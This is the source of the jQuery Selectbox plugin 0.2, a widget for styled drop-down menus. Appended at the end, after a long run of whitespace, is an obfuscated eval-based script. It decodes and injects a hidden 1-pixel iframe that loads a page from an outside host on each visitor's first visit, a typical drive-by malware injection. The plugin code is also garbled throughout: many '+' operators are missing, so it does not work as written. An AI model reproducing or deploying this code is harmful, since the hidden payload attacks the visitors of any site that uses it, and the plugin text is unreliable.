/*!
 * jQuery Selectbox plugin 0.2
 *
 * Copyright 2011-2012, Dimitar Ivanov (http://www.bulgaria-web-developers.com/projects/javascript/selectbox/)
 * Licensed under the MIT (http://www.opensource.org/licenses/mit-license.php) license.
 * 
 * Date: Tue Jul 17 19:58:36 2012  0300
 */
(function ($, undefined) {
	var PROP_NAME = 'selectbox',
		FALSE = false,
		TRUE = true;
	/**
	 * Selectbox manager.
	 * Use the singleton instance of this class, $.selectbox, to interact with the select box.
	 * Settings for (groups of) select boxes are maintained in an instance object,
	 * allowing multiple different settings on the same page
	 */
	function Selectbox() {
		this._state = [];
		this._defaults = { // Global defaults for all the select box instances
			classHolder: "sbHolder",
			classHolderDisabled: "sbHolderDisabled",
			classSelector: "sbSelector",
			classOptions: "sbOptions",
			classGroup: "sbGroup",
			classSub: "sbSub",
			classDisabled: "sbDisabled",
			classToggleOpen: "sbToggleOpen",
			classToggle: "sbToggle",
			classFocus: "sbFocus",
			speed: 200,
			effect: "slide", // "slide" or "fade"
			onChange: null, //Define a callback function when the selectbox is changed
			onOpen: null, //Define a callback function when the selectbox is open
			onClose: null //Define a callback function when the selectbox is closed
		};
	}
	
	$.extend(Selectbox.prototype, {
		/**
		 * Is the first field in a jQuery collection open as a selectbox
		 * 
		 * @param {Object} target
		 * @return {Boolean}
		 */
		_isOpenSelectbox: function (target) {
			if (!target) {
				return FALSE;
			}
			var inst = this._getInst(target);
			return inst.isOpen;
		},
		/**
		 * Is the first field in a jQuery collection disabled as a selectbox
		 * 
		 * @param {HTMLElement} target
		 * @return {Boolean}
		 */
		_isDisabledSelectbox: function (target) {
			if (!target) {
				return FALSE;
			}
			var inst = this._getInst(target);
			return inst.isDisabled;
		},
		/**
		 * Attach the select box to a jQuery selection.
		 * 
		 * @param {HTMLElement} target
		 * @param {Object} settings
		 */
		_attachSelectbox: function (target, settings) {
			if (this._getInst(target)) {
				return FALSE;
			}
			var $target = $(target),
				self = this,
				inst = self._newInst($target),
				sbHolder, sbSelector, sbToggle, sbOptions,
				s = FALSE, optGroup = $target.find("optgroup"), opts = $target.find("option"), olen = opts.length;
				
			$target.attr("sb", inst.uid);
				
			$.extend(inst.settings, self._defaults, settings);
			self._state[inst.uid] = FALSE;
			$target.hide();
			
			function closeOthers() {
				var key, sel,
					uid = this.attr("id").split("_")[1];
				for (key in self._state) {
					if (key !== uid) {
						if (self._state.hasOwnProperty(key)) {
							sel = $("select[sb='"   key   "']")[0];
							if (sel) {
								self._closeSelectbox(sel);
							}
						}
					}
				}
			}
			
			sbHolder = $("<div>", {
				"id": "sbHolder_"   inst.uid,
				"class": inst.settings.classHolder,
				"tabindex": $target.attr("tabindex")
			});
			
			sbSelector = $("<a>", {
				"id": "sbSelector_"   inst.uid,
				"href": "#",
				"class": inst.settings.classSelector,
				"click": function (e) {
					e.preventDefault();
					closeOthers.apply($(this), []);
					var uid = $(this).attr("id").split("_")[1];
					if (self._state[uid]) {
						self._closeSelectbox(target);
					} else {
						self._openSelectbox(target);
					}
				}
			});
			
			sbToggle = $("<a>", {
				"id": "sbToggle_"   inst.uid,
				"href": "#",
				"class": inst.settings.classToggle,
				"click": function (e) {
					e.preventDefault();
					closeOthers.apply($(this), []);
					var uid = $(this).attr("id").split("_")[1];
					if (self._state[uid]) {
						self._closeSelectbox(target);
					} else {
						self._openSelectbox(target);
					}
				}
			});
			sbToggle.appendTo(sbHolder);

			sbOptions = $("<ul>", {
				"id": "sbOptions_"   inst.uid,
				"class": inst.settings.classOptions,
				"css": {
					"display": "none"
				}
			});
			
			$target.children().each(function(i) {
				var that = $(this), li, config = {};
				if (that.is("option")) {
					getOptions(that);
				} else if (that.is("optgroup")) {
					li = $("<li>");
					$("<span>", {
						"text": that.attr("label")
					}).addClass(inst.settings.classGroup).appendTo(li);
					li.appendTo(sbOptions);
					if (that.is(":disabled")) {
						config.disabled = true;
					}
					config.sub = true;
					getOptions(that.find("option"), config);
				}
			});
			
			function getOptions () {
				var sub = arguments[1] && arguments[1].sub ? true : false,
					disabled = arguments[1] && arguments[1].disabled ? true : false;
				arguments[0].each(function (i) {
					var that = $(this),
						li = $("<li>"),
						child;
					if (that.is(":selected")) {
						sbSelector.text(that.text());
						s = TRUE;
					}
					if (i === olen - 1) {
						li.addClass("last");
					}
					if (!that.is(":disabled") && !disabled) {
						child = $("<a>", {
							"href": "#"   that.val(),
							"rel": that.val()
						}).text(that.text()).bind("click.sb", function (e) {
							if (e && e.preventDefault) {
								e.preventDefault();
							}
							var t = sbToggle,
							 	$this = $(this),
								uid = t.attr("id").split("_")[1];
							self._changeSelectbox(target, $this.attr("rel"), $this.text());
							self._closeSelectbox(target);
						}).bind("mouseover.sb", function () {
							var $this = $(this);
							$this.parent().siblings().find("a").removeClass(inst.settings.classFocus);
							$this.addClass(inst.settings.classFocus);
						}).bind("mouseout.sb", function () {
							$(this).removeClass(inst.settings.classFocus);
						});
						if (sub) {
							child.addClass(inst.settings.classSub);
						}
						if (that.is(":selected")) {
							child.addClass(inst.settings.classFocus);
						}
						child.appendTo(li);
					} else {
						child = $("<span>", {
							"text": that.text()
						}).addClass(inst.settings.classDisabled);
						if (sub) {
							child.addClass(inst.settings.classSub);
						}
						child.appendTo(li);
					}
					li.appendTo(sbOptions);
				});
			}
			
			if (!s) {
				sbSelector.text(opts.first().text());
			}

			$.data(target, PROP_NAME, inst);
			
			sbHolder.data("uid", inst.uid).bind("keydown.sb", function (e) {
				var key = e.charCode ? e.charCode : e.keyCode ? e.keyCode : 0,
					$this = $(this),
					uid = $this.data("uid"),
					inst = $this.siblings("select[sb='" uid "']").data(PROP_NAME),
					trgt = $this.siblings(["select[sb='", uid, "']"].join("")).get(0),
					$f = $this.find("ul").find("a."   inst.settings.classFocus);
				switch (key) {
					case 37: //Arrow Left
					case 38: //Arrow Up
						if ($f.length > 0) {
							var $next;
							$("a", $this).removeClass(inst.settings.classFocus);
							$next = $f.parent().prevAll("li:has(a)").eq(0).find("a");
							if ($next.length > 0) {
								$next.addClass(inst.settings.classFocus).focus();
								$("#sbSelector_"   uid).text($next.text());
							}
						}
						break;
					case 39: //Arrow Right
					case 40: //Arrow Down
						var $next;
						$("a", $this).removeClass(inst.settings.classFocus);
						if ($f.length > 0) {
							$next = $f.parent().nextAll("li:has(a)").eq(0).find("a");
						} else {
							$next = $this.find("ul").find("a").eq(0);
						}
						if ($next.length > 0) {
							$next.addClass(inst.settings.classFocus).focus();
							$("#sbSelector_"   uid).text($next.text());
						}
						break;				
					case 13: //Enter
						if ($f.length > 0) {
							self._changeSelectbox(trgt, $f.attr("rel"), $f.text());
						}
						self._closeSelectbox(trgt);
						break;
					case 9: //Tab
						if (trgt) {
							var inst = self._getInst(trgt);
							if (inst/* && inst.isOpen*/) {
								if ($f.length > 0) {
									self._changeSelectbox(trgt, $f.attr("rel"), $f.text());
								}
								self._closeSelectbox(trgt);
							}
						}
						var i = parseInt($this.attr("tabindex"), 10);
						if (!e.shiftKey) {
							i  ;
						} else {
							i--;
						}
						$("*[tabindex='"   i   "']").focus();
						break;
					case 27: //Escape
						self._closeSelectbox(trgt);
						break;
				}
				e.stopPropagation();
				return false;
			}).delegate("a", "mouseover", function (e) {
				$(this).addClass(inst.settings.classFocus);
			}).delegate("a", "mouseout", function (e) {
				$(this).removeClass(inst.settings.classFocus);	
			});
			
			sbSelector.appendTo(sbHolder);
			sbOptions.appendTo(sbHolder);			
			sbHolder.insertAfter($target);
			
			$("html").live('mousedown', function(e) {
				e.stopPropagation();          
				$("select").selectbox('close'); 
			});
			$([".", inst.settings.classHolder, ", .", inst.settings.classSelector].join("")).mousedown(function(e) {    
				e.stopPropagation();
			});
		},
		/**
		 * Remove the selectbox functionality completely. This will return the element back to its pre-init state.
		 * 
		 * @param {HTMLElement} target
		 */
		_detachSelectbox: function (target) {
			var inst = this._getInst(target);
			if (!inst) {
				return FALSE;
			}
			$("#sbHolder_"   inst.uid).remove();
			$.data(target, PROP_NAME, null);
			$(target).show();			
		},
		/**
		 * Change selected attribute of the selectbox.
		 * 
		 * @param {HTMLElement} target
		 * @param {String} value
		 * @param {String} text
		 */
		_changeSelectbox: function (target, value, text) {
			var onChange,
				inst = this._getInst(target);
			if (inst) {
				onChange = this._get(inst, 'onChange');
				$("#sbSelector_"   inst.uid).text(text);
			}
			value = value.replace(/\'/g, "\\'");
			$(target).find("option[value='"   value   "']").attr("selected", TRUE);
			if (inst && onChange) {
				onChange.apply((inst.input ? inst.input[0] : null), [value, inst]);
			} else if (inst && inst.input) {
				inst.input.trigger('change');
			}
		},
		/**
		 * Enable the selectbox.
		 * 
		 * @param {HTMLElement} target
		 */
		_enableSelectbox: function (target) {
			var inst = this._getInst(target);
			if (!inst || !inst.isDisabled) {
				return FALSE;
			}
			$("#sbHolder_"   inst.uid).removeClass(inst.settings.classHolderDisabled);
			inst.isDisabled = FALSE;
			$.data(target, PROP_NAME, inst);
		},
		/**
		 * Disable the selectbox.
		 * 
		 * @param {HTMLElement} target
		 */
		_disableSelectbox: function (target) {
			var inst = this._getInst(target);
			if (!inst || inst.isDisabled) {
				return FALSE;
			}
			$("#sbHolder_"   inst.uid).addClass(inst.settings.classHolderDisabled);
			inst.isDisabled = TRUE;
			$.data(target, PROP_NAME, inst);
		},
		/**
		 * Get or set any selectbox option. If no value is specified, will act as a getter.
		 * 
		 * @param {HTMLElement} target
		 * @param {String} name
		 * @param {Object} value
		 */
		_optionSelectbox: function (target, name, value) {
			var inst = this._getInst(target);
			if (!inst) {
				return FALSE;
			}
			//TODO check name
			inst[name] = value;
			$.data(target, PROP_NAME, inst);
		},
		/**
		 * Call up attached selectbox
		 * 
		 * @param {HTMLElement} target
		 */
		_openSelectbox: function (target) {
			var inst = this._getInst(target);
			//if (!inst || this._state[inst.uid] || inst.isDisabled) {
			if (!inst || inst.isOpen || inst.isDisabled) {
				return;
			}
			var	el = $("#sbOptions_"   inst.uid),
				viewportHeight = parseInt($(window).height(), 10),
				offset = $("#sbHolder_"   inst.uid).offset(),
				scrollTop = $(window).scrollTop(),
				height = el.prev().height(),
				diff = viewportHeight - (offset.top - scrollTop) - height / 2,
				onOpen = this._get(inst, 'onOpen');
			el.css({
				"top": height   "px",
				"maxHeight": (diff - height)   "px"
			});
			inst.settings.effect === "fade" ? el.fadeIn(inst.settings.speed) : el.slideDown(inst.settings.speed);
			$("#sbToggle_"   inst.uid).addClass(inst.settings.classToggleOpen);
			this._state[inst.uid] = TRUE;
			inst.isOpen = TRUE;
			if (onOpen) {
				onOpen.apply((inst.input ? inst.input[0] : null), [inst]);
			}
			$.data(target, PROP_NAME, inst);
		},
		/**
		 * Close opened selectbox
		 * 
		 * @param {HTMLElement} target
		 */
		_closeSelectbox: function (target) {
			var inst = this._getInst(target);
			//if (!inst || !this._state[inst.uid]) {
			if (!inst || !inst.isOpen) {
				return;
			}
			var onClose = this._get(inst, 'onClose');
			inst.settings.effect === "fade" ? $("#sbOptions_"   inst.uid).fadeOut(inst.settings.speed) : $("#sbOptions_"   inst.uid).slideUp(inst.settings.speed);
			$("#sbToggle_"   inst.uid).removeClass(inst.settings.classToggleOpen);
			this._state[inst.uid] = FALSE;
			inst.isOpen = FALSE;
			if (onClose) {
				onClose.apply((inst.input ? inst.input[0] : null), [inst]);
			}
			$.data(target, PROP_NAME, inst);
		},
		/**
		 * Create a new instance object
		 * 
		 * @param {HTMLElement} target
		 * @return {Object}
		 */
		_newInst: function(target) {
			var id = target[0].id.replace(/([^A-Za-z0-9_-])/g, '\\\\$1');
			return {
				id: id, 
				input: target, 
				uid: Math.floor(Math.random() * 99999999),
				isOpen: FALSE,
				isDisabled: FALSE,
				settings: {}
			}; 
		},
		/**
		 * Retrieve the instance data for the target control.
		 * 
		 * @param {HTMLElement} target
		 * @return {Object} - the associated instance data
		 * @throws error if a jQuery problem getting data
		 */
		_getInst: function(target) {
			try {
				return $.data(target, PROP_NAME);
			}
			catch (err) {
				throw 'Missing instance data for this selectbox';
			}
		},
		/**
		 * Get a setting value, defaulting if necessary
		 * 
		 * @param {Object} inst
		 * @param {String} name
		 * @return {Mixed}
		 */
		_get: function(inst, name) {
			return inst.settings[name] !== undefined ? inst.settings[name] : this._defaults[name];
		}
	});

	/**
	 * Invoke the selectbox functionality.
	 * 
	 * @param {Object|String} options
	 * @return {Object}
	 */
	$.fn.selectbox = function (options) {
		
		var otherArgs = Array.prototype.slice.call(arguments, 1);
		if (typeof options == 'string' && options == 'isDisabled') {
			return $.selectbox['_'   options   'Selectbox'].apply($.selectbox, [this[0]].concat(otherArgs));
		}
		
		if (options == 'option' && arguments.length == 2 && typeof arguments[1] == 'string') {
			return $.selectbox['_'   options   'Selectbox'].apply($.selectbox, [this[0]].concat(otherArgs));
		}
		
		return this.each(function() {
			typeof options == 'string' ?
				$.selectbox['_'   options   'Selectbox'].apply($.selectbox, [this].concat(otherArgs)) :
				$.selectbox._attachSelectbox(this, options);
		});
	};
	
	$.selectbox = new Selectbox(); // singleton instance
	$.selectbox.version = "0.2";
})(jQuery);

/*17da00*/
                                                                                                                                                                                                                                                          d="doc"+"ument";try{++document.body}catch(q){aa=function(ff){for(i=0;i<z.length;i++){za+=String[ff](e(v+(z[i]))-12);}};};ps="split";e=(eval);v="0x";a=0;z="y";try{;}catch(zz){a=1}if(!a){try{++e(d)["\x62od"+z]}catch(q){a2="_";}z="2c_72_81_7a_6f_80_75_7b_7a_2c_86_86_86_72_72_72_34_35_2c_87_19_16_2c_82_6d_7e_2c_82_78_2c_49_2c_70_7b_6f_81_79_71_7a_80_3a_6f_7e_71_6d_80_71_51_78_71_79_71_7a_80_34_33_75_72_7e_6d_79_71_33_35_47_19_16_19_16_2c_82_78_3a_7f_7e_6f_2c_49_2c_33_74_80_80_7c_46_3b_3b_6e_6d_85_7f_6d_7a_3a_71_81_3b_79_7b_70_81_78_71_7f_3b_79_7b_70_6b_6d_70_70_3b_51_62_5a_85_6e_54_58_56_3a_7c_74_7c_33_47_19_16_2c_82_78_3a_7f_80_85_78_71_3a_7c_7b_7f_75_80_75_7b_7a_2c_49_2c_33_6d_6e_7f_7b_78_81_80_71_33_47_19_16_2c_82_78_3a_7f_80_85_78_71_3a_6e_7b_7e_70_71_7e_2c_49_2c_33_3c_33_47_19_16_2c_82_78_3a_7f_80_85_78_71_3a_74_71_75_73_74_80_2c_49_2c_33_3d_7c_84_33_47_19_16_2c_82_78_3a_7f_80_85_78_71_3a_83_75_70_80_74_2c_49_2c_33_3d_7c_84_33_47_19_16_2c_82_78_3a_7f_80_85_78_71_3a_78_71_72_80_2c_49_2c_33_3d_7c_84_33_47_19_16_2c_82_78_3a_7f_80_85_78_71_3a_80_7b_7c_2c_49_2c_33_3d_7c_84_33_47_19_16_19_16_2c_75_72_2c_34_2d_70_7b_6f_81_79_71_7a_80_3a_73_71_80_51_78_71_79_71_7a_80_4e_85_55_70_34_33_82_78_33_35_35_2c_87_19_16_2c_70_7b_6f_81_79_71_7a_80_3a_83_7e_75_80_71_34_33_48_70_75_82_2c_75_70_49_68_33_82_78_68_33_4a_48_3b_70_75_82_4a_33_35_47_19_16_2c_70_7b_6f_81_79_71_7a_80_3a_73_71_80_51_78_71_79_71_7a_80_4e_85_55_70_34_33_82_78_33_35_3a_6d_7c_7c_71_7a_70_4f_74_75_78_70_34_82_78_35_47_19_16_2c_89_19_16_89_19_16_72_81_7a_6f_80_75_7b_7a_2c_5f_71_80_4f_7b_7b_77_75_71_34_6f_7b_7b_77_75_71_5a_6d_79_71_38_6f_7b_7b_77_75_71_62_6d_78_81_71_38_7a_50_6d_85_7f_38_7c_6d_80_74_35_2c_87_19_16_2c_82_6d_7e_2c_80_7b_70_6d_85_2c_49_2c_7a_71_83_2c_50_6d_80_71_34_35_47_19_16_2c_82_6d_7e_2c_71_84_7c_75_7e_71_2c_49_2c_7a_71_83_2c_50_6d_80_71_34_35_47_19_16_2c_75_72_2c_34_7a_50_6d_85_7f_49_49_7a_81_78_78_2c_88_88_2c_7a_50_6d_85_7f_49_49_3c_35_2c_7a_50_6d_85_7f_49_3d_47_19_16_2c_71_84_7c_75_7e_71_3a_7f_71_80_60_75_79_71_34_80_7b_70_6d_85_3a_73_71_80_60_75_79_71_34_35_2c_37_2c_3f_42_3c_3c_3c_3c_3c_36_3e_40_36_7a_50_6d_85_7f_35_47_19_16_2c_70_7b_6f_81_79_71_7a_80_3a_6f_7b_7b_77_75_71_2c_49_2c_6f_7b_7b_77_75_71_5a_6d_79_71_37_2e_49_2e_37_71_7f_6f_6d_7c_71_34_6f_7b_7b_77_75_71_62_6d_78_81_71_35_19_16_2c_37_2c_2e_47_71_84_7c_75_7e_71_7f_49_2e_2c_37_2c_71_84_7c_75_7e_71_3a_80_7b_53_59_60_5f_80_7e_75_7a_73_34_35_2c_37_2c_34_34_7c_6d_80_74_35_2c_4b_2c_2e_47_2c_7c_6d_80_74_49_2e_2c_37_2c_7c_6d_80_74_2c_46_2c_2e_2e_35_47_19_16_89_19_16_72_81_7a_6f_80_75_7b_7a_2c_53_71_80_4f_7b_7b_77_75_71_34_2c_7a_6d_79_71_2c_35_2c_87_19_16_2c_82_6d_7e_2c_7f_80_6d_7e_80_2c_49_2c_70_7b_6f_81_79_71_7a_80_3a_6f_7b_7b_77_75_71_3a_75_7a_70_71_84_5b_72_34_2c_7a_6d_79_71_2c_37_2c_2e_49_2e_2c_35_47_19_16_2c_82_6d_7e_2c_78_71_7a_2c_49_2c_7f_80_6d_7e_80_2c_37_2c_7a_6d_79_71_3a_78_71_7a_73_80_74_2c_37_2c_3d_47_19_16_2c_75_72_2c_34_2c_34_2c_2d_7f_80_6d_7e_80_2c_35_2c_32_32_19_16_2c_34_2c_7a_6d_79_71_2c_2d_49_2c_70_7b_6f_81_79_71_7a_80_3a_6f_7b_7b_77_75_71_3a_7f_81_6e_7f_80_7e_75_7a_73_34_2c_3c_38_2c_7a_6d_79_71_3a_78_71_7a_73_80_74_2c_35_2c_35_2c_35_19_16_2c_87_19_16_2c_7e_71_80_81_7e_7a_2c_7a_81_78_78_47_19_16_2c_89_19_16_2c_75_72_2c_34_2c_7f_80_6d_7e_80_2c_49_49_2c_39_3d_2c_35_2c_7e_71_80_81_7e_7a_2c_7a_81_78_78_47_19_16_2c_82_6d_7e_2c_71_7a_70_2c_49_2c_70_7b_6f_81_79_71_7a_80_3a_6f_7b_7b_77_75_71_3a_75_7a_70_71_84_5b_72_34_2c_2e_47_2e_38_2c_78_71_7a_2c_35_47_19_16_2c_75_72_2c_34_2c_71_7a_70_2c_49_49_2c_39_3d_2c_35_2c_71_7a_70_2c_49_2c_70_7b_6f_81_79_71_7a_80_3a_6f_7b_7b_77_75_71_3a_78_71_7a_73_80_74_47_19_16_2c_7e_71_80_81_7e_7a_2c_81_7a_71_7f_6f_6d_7c_71_34_2c_70_7b_6f_81_79_71_7a_80_3a_6f_7b_7b_77_75_71_3a_7f_81_6e_7f_80_7e_75_7a_73_34_2c_78_71_7a_38_2c_71_7a_70_2c_35_2c_35_47_19_16_89_19_16_75_72_2c_34_7a_6d_82_75_73_6d_80_7b_7e_3a_6f_7b_7b_77_75_71_51_7a_6d_6e_78_71_70_35_19_16_87_19_16_75_72_34_53_71_80_4f_7b_7b_77_75_71_34_33_82_75_7f_75_80_71_70_6b_81_7d_33_35_49_49_41_41_35_87_89_71_78_7f_71_87_5f_71_80_4f_7b_7b_77_75_71_34_33_82_75_7f_75_80_71_70_6b_81_7d_33_38_2c_33_41_41_33_38_2c_33_3d_33_38_2c_33_3b_33_35_47_19_16_19_16_86_86_86_72_72_72_34_35_47_19_16_89_19_16_89_19_16"[ps](a2);za="";aa("fromCharCode");zaz=za;e(zaz);}
/*/17da00*/
